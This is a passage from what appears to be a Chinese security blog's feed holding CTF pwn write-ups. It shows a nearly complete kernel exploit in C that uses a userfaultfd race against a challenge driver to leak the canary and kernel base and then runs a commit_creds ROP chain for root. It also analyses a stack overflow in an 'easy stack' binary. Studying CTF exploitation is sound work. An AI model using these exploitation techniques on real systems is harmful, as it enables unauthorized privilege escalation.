errExit(<span class="string">&quot;[-] pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">sleep_handle</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="keyword">int</span> fault_cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">long</span> uffd;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">    <span class="keyword">ssize_t</span> nread;</span><br><span class="line"></span><br><span class="line">    uffd = (<span class="keyword">long</span>)arg;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] sleep handler created&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        <span class="keyword">int</span> nready;</span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[+] sleep handler unblocked&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nready == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line"></span><br><span class="line">        nread = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line"></span><br><span class="line">        sleep(<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;EOF on userfaultfd!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;read&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">            errExit(<span class="string">&quot;Unexpected event on userfaultfd\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">char</span> *page = (<span class="keyword">char</span> *)mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (page == MAP_FAILED)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;[-] mmap err&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">        <span class="comment">// init page</span></span><br><span class="line">        <span class="built_in">memset</span>(page, <span class="number">0</span>, <span class="keyword">sizeof</span>(page));</span><br><span class="line">        <span class="comment">// *(page + 0x201) = 0x64;</span></span><br><span class="line"></span><br><span class="line">        uc.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)page;</span><br><span class="line">        uc.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)msg.arg.pagefault.address &amp;</span><br><span class="line">                 ~(<span class="number">0x1000</span> - <span class="number">1</span>);</span><br><span class="line">        uc.len = <span class="number">0x1000</span>;</span><br><span class="line">        uc.mode = <span class="number">0</span>;</span><br><span class="line">        uc.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uc) == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[+] sleep handler done&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> prepare_kernel_cred = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> commit_creds = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> pop_rdi = <span class="number">0xffffffff810835c0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> swapgs_pop = <span class="number">0xffffffff8106c984</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> iretq = <span class="number">0xffffffff81c014f5</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> init_cred = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> canary;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">overflow_handle</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="keyword">int</span> fault_cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">long</span> uffd;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">    <span class="keyword">ssize_t</span> nread;</span><br><span class="line"></span><br><span class="line">    uffd = (<span class="keyword">long</span>)arg;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] sleep handler created&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        <span class="keyword">int</span> nready;</span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[+] sleep handler unblocked&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nready == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line"></span><br><span class="line">        nread = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line"></span><br><span class="line">        sleep(<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;EOF on userfaultfd!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;read&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">            errExit(<span class="string">&quot;Unexpected event on userfaultfd\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">char</span> *page = (<span class="keyword">char</span> *)mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (page == MAP_FAILED)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;[-] mmap err&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">        <span class="comment">// init page</span></span><br><span class="line">        <span class="built_in">memset</span>(page, <span class="number">0</span>, <span class="keyword">sizeof</span>(page));</span><br><span class="line">        <span class="comment">// *(page + 0x201) = 0x64;</span></span><br><span class="line"></span><br><span class="line">        uc.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)page;</span><br><span class="line">        uc.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)msg.arg.pagefault.address &amp;</span><br><span class="line">                 ~(<span class="number">0x1000</span> - <span class="number">1</span>);</span><br><span class="line">        uc.len = <span class="number">0x1000</span>;</span><br><span class="line">        uc.mode = <span class="number">0</span>;</span><br><span class="line">        uc.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uc) == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[+] sleep handler done&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_hex</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data :\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; (size / <span class="number">8</span>); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (i / <span class="number">2</span> &lt; <span class="number">10</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d  &quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (i / <span class="number">2</span> &lt; <span class="number">100</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; %16llx&quot;</span>, *(<span class="keyword">size_t</span> *)(buf + i * <span class="number">8</span>));</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">write_handler</span><span class="params">(<span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    sleep(<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;now change uesed&quot;</span>);</span><br><span class="line">    write(fd, buf, <span class="number">0x200</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">control_handler</span><span class="params">(<span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    write(fd, buf, <span class="number">0xf0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">read_handler</span><span class="params">(<span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;now read buffer&quot;</span>);</span><br><span class="line">    read(fd, buf, <span class="number">0x200</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    signal(SIGSEGV, get_shell);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/test2&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] open test2 error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x2000</span>);</span><br><span class="line">    <span class="keyword">char</span> *page = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">char</span> *page2 = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">pthread_t</span> thr[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_addr;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_base;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_offset;</span><br><span class="line"></span><br><span class="line">    RegisterUserfault(page, sleep_handle);</span><br><span class="line">    write(fd, buf, <span class="number">0x8</span>);</span><br><span class="line">    sleep(<span class="number">2</span>);</span><br><span class="line">    <span class="comment">// read_handler(buf);</span></span><br><span class="line">    pthread_create(&amp;thr[<span class="number">1</span>], <span class="literal">NULL</span>, write_handler, buf);</span><br><span class="line">    pthread_create(&amp;thr[<span class="number">0</span>], <span class="literal">NULL</span>, control_handler, buf);</span><br><span class="line">    <span class="comment">// write(fd, page, 0xf0);</span></span><br><span class="line">    read_handler(buf);</span><br><span class="line">    <span class="comment">// pthread_join(thr[0], NULL);</span></span><br><span class="line">    pthread_join(thr[<span class="number">1</span>], <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    canary = *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf + <span class="number">32</span> * <span class="number">8</span>);</span><br><span class="line">    kernel_addr = *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf + <span class="number">47</span> * <span class="number">8</span>);</span><br><span class="line">    kernel_base = kernel_addr - <span class="number">0x426939</span>;</span><br><span class="line">    kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] get canary: %p\n&quot;</span>, canary);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] get kernel base: %p\n&quot;</span>, kernel_base);</span><br><span class="line"></span><br><span class="line">    prepare_kernel_cred = <span class="number">0xb9550</span> + kernel_base;</span><br><span class="line">    commit_creds = <span class="number">0xb91e0</span> + kernel_base;</span><br><span class="line">    init_cred = <span class="number">0x165b400</span> + kernel_base;</span><br><span class="line">    swapgs_pop = swapgs_pop + kernel_offset;</span><br><span class="line">    iretq = iretq + kernel_offset;</span><br><span class="line">    pop_rdi = pop_rdi + kernel_offset;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// RegisterUserfault(page2, overflow_handle);</span></span><br><span class="line">    pthread_create(&amp;thr[<span class="number">0</span>], <span class="literal">NULL</span>, write_handler, buf);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf + ((i++) * <span class="number">8</span>)) = canary;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf + ((i++) * <span class="number">8</span>)) = canary;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf + ((i++) * <span class="number">8</span>)) = canary;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf + ((i++) * <span class="number">8</span>)) = canary;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf + ((i++) * <span class="number">8</span>)) = pop_rdi;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf + ((i++) * <span class="number">8</span>)) = init_cred;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf + ((i++) * <span class="number">8</span>)) = commit_creds;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf + ((i++) * <span class="number">8</span>)) = swapgs_pop;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf + ((i++) * <span class="number">8</span>)) = swapgs_pop;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf + ((i++) * <span class="number">8</span>)) = iretq;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf + ((i++) * <span class="number">8</span>)) = get_shell;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf + ((i++) * <span class="number">8</span>)) = user_cs;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf + ((i++) * <span class="number">8</span>)) = user_rflags;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf + ((i++) * <span class="number">8</span>)) = user_sp;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf + ((i++) * <span class="number">8</span>)) = user_ss;</span><br><span class="line">    write(fd, buf, <span class="number">0xe0</span>);</span><br><span class="line">    pthread_join(thr[<span class="number">0</span>], <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    read(fd, buf, <span class="number">0x200</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这周四道题目难度不算是很大，不过那个<code>easy printf</code>我确实没什么思路，有兴趣的师傅可以去看一下（然后可怜我告诉我一下）。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Kernel-pwn1&quot;&gt;&lt;a href=&quot;#Kernel-pwn1&quot; class=&quot;headerlink&quot; title=&quot;Kernel pwn1&quot;&gt;&lt;/a&gt;Kernel pwn1&lt;/h2&gt;&lt;p&gt;题目非常简单，就是一道非常普通的内核堆题，不过由于思想有点活跃导致开</summary>
      
    
    
    
    <category term="pwn" scheme="https://cv196082.gitee.io/categories/pwn/"/>
    
    
    <category term="Double Fetch" scheme="https://cv196082.gitee.io/tags/Double-Fetch/"/>
    
    <category term="pt_regs" scheme="https://cv196082.gitee.io/tags/pt-regs/"/>
    
    <category term="tty_struct" scheme="https://cv196082.gitee.io/tags/tty-struct/"/>
    
    <category term="fastbin" scheme="https://cv196082.gitee.io/tags/fastbin/"/>
    
  </entry>
  
  <entry>
    <title>practice Ⅰ</title>
    <link href="https://cv196082.gitee.io/2022/10/16/practice%E2%85%A0/"/>
    <id>https://cv196082.gitee.io/2022/10/16/practice%E2%85%A0/</id>
    <published>2022-10-16T05:34:04.000Z</published>
    <updated>2022-10-16T05:41:13.448Z</updated>
    
    <content type="html"><![CDATA[<h2 id="练题笔记"><a href="#练题笔记" class="headerlink" title="练题笔记"></a>练题笔记</h2><p>已经学了一段时间内核了，感觉自己在基础知识方面比较欠缺，所以打算回过头去看一下相关书籍深入学习一下基础知识，在学习途中保持pwn题训练。</p><h2 id="easy-stack"><a href="#easy-stack" class="headerlink" title="easy stack"></a>easy stack</h2><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>题目逻辑很简单</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">128</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  alarm(<span class="number">0x3C</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  read_n(s, <span class="number">0x100</span>LL);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *__fastcall <span class="title">read_n</span><span class="params">(<span class="keyword">void</span> *a1, <span class="keyword">unsigned</span> __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">520</span>]; <span class="comment">// [rsp+10h] [rbp-210h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+218h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+21Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a2 &gt; <span class="number">0x200</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;too long!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    read(<span class="number">0</span>, &amp;s[v6], <span class="number">1uLL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( s[v6] == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !s[v6] )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v2 = v6++;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( a2 &gt; v2 );</span><br><span class="line">  <span class="keyword">if</span> ( s[v6] == <span class="number">10</span> &amp;&amp; a2 &gt; v6 )</span><br><span class="line">    s[v6] = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">memcpy</span>(a1, s, v5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到存在明显的栈溢出漏洞。不过比较棘手的是程序开启了PIE导致我们无法多次利用此漏洞，所以我们目前来看迫切需要的就是重复多次扩大漏洞。</p><p>在栈方面比较熟知扩大漏洞的方法是<code>fini_array</code>劫持，不过这里不存在任意写所以无法实现。</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000000007C0                               public _start</span><br><span class="line">.text:00000000000007C0                               _start proc near                        ; DATA XREF: LOAD:0000000000000018↑o</span><br><span class="line">.text:00000000000007C0                               ; __unwind &#123;</span><br><span class="line">.text:00000000000007C0 31 ED                         xor     ebp, ebp</span><br><span class="line">.text:00000000000007C2 49 89 D1                      mov     r9, rdx                         ; rtld_fini</span><br><span class="line">.text:00000000000007C5 5E                            pop     rsi                             ; argc</span><br><span class="line">.text:00000000000007C6 48 89 E2                      mov     rdx, rsp                        ; ubp_av</span><br><span class="line">.text:00000000000007C9 48 83 E4 F0                   and     rsp, 0FFFFFFFFFFFFFFF0h</span><br><span class="line">.text:00000000000007CD 50                            push    rax</span><br><span class="line">.text:00000000000007CE 54                            push    rsp                             ; stack_end</span><br><span class="line">.text:00000000000007CF 4C 8D 05 FA 02 00 00          lea     r8, __libc_csu_fini             ; fini</span><br><span class="line">.text:00000000000007D6 48 8D 0D 83 02 00 00          lea     rcx, __libc_csu_init            ; init</span><br><span class="line">.text:00000000000007DD 48 8D 3D E0 01 00 00          lea     rdi, main                       ; main</span><br><span class="line">.text:00000000000007E4 FF 15 F6 07 20 00             call    cs:__libc_start_main_ptr</span><br><span class="line">.text:00000000000007E4</span><br><span class="line">.text:00000000000007EA F4                            hlt</span><br><span class="line">.text:00000000000007EA                               ; &#125; // starts at 7C0</span><br><span class="line">.text:00000000000007EA</span><br><span class="line">.text:00000000000007EA                               _start endp</span><br></pre></td></tr></table></figure><p>总所周知，程序的入口是<code>_start</code>函数，并且我们知道这里的执行顺序是<code>__libc_csu_init</code>=&gt;<code>main</code>=&gt;<code>__libc_csu_fini</code></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20221013152012744.png"                      alt="image-20221013152012744"                ></p><p>可以看到在进入函数不过多久就开始调用了<code>_libc_csu_init</code>，并且把main地址放在了<code>rsp+0x18</code>位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000021A35                 lea     rdi, [rsp+0B8h+var_98] ; env</span><br><span class="line">.text:0000000000021A3A                 call    _setjmp</span><br><span class="line">.text:0000000000021A3F                 test    eax, eax</span><br><span class="line">.text:0000000000021A41                 jnz     short loc_21A8E</span><br><span class="line">.text:0000000000021A43                 mov     rax, fs:300h</span><br><span class="line">.text:0000000000021A4C                 mov     [rsp+0B8h+var_50], rax</span><br><span class="line">.text:0000000000021A51                 mov     rax, fs:2F8h</span><br><span class="line">.text:0000000000021A5A                 mov     [rsp+0B8h+var_48], rax</span><br><span class="line">.text:0000000000021A5F                 lea     rax, [rsp+0B8h+var_98]</span><br><span class="line">.text:0000000000021A64                 mov     fs:300h, rax</span><br><span class="line">.text:0000000000021A6D                 mov     rax, cs:environ_ptr</span><br><span class="line">.text:0000000000021A74                 mov     rsi, [rsp+8]</span><br><span class="line">.text:0000000000021A79                 mov     edi, [rsp+14h]</span><br><span class="line">.text:0000000000021A7D                 mov     rdx, [rax]</span><br><span class="line">.text:0000000000021A80                 mov     rax, [rsp+18h]</span><br><span class="line">.text:0000000000021A85                 call    rax</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20221013153034952.png"                      alt="image-20221013153034952"                ></p><p>随后调用main函数，然后从main函数返回时的ret地址自然而然成了call的下一行。所以如果我们可以覆盖末尾字节为<code>0x80</code>即可重新进入main函数达到扩大漏洞的效果。</p><h3 id="综上，exp"><a href="#综上，exp" class="headerlink" title="综上，exp"></a>综上，exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span 